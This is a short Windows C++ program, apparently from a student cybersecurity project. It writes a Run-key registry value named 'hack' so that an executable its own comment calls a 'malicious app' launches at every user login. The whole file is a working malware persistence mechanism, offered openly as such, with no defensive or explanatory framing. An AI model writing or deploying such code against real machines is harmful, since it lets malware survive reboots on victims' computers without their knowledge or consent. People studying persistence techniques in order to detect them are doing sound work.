#include <windows.h>
#include <string.h>
#include <iostream>

int main(int argc, char* argv[]) {
    HKEY hkey = NULL;

    // malicious app
    const char* exe = "D:\\Cyber\\YB_CYBER\\project\\FinalProject\\De_Bug\\De_Bug\\mewo.exe";

    // startup
    LONG res = RegOpenKeyExA(HKEY_CURRENT_USER, (LPCSTR)"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_WRITE, &hkey);

    // create new registry key
    RegSetValueExA(hkey, (LPCSTR)"hack", 0, REG_SZ, (unsigned char*)exe, strlen(exe));
    RegCloseKey(hkey);
    return 0;
}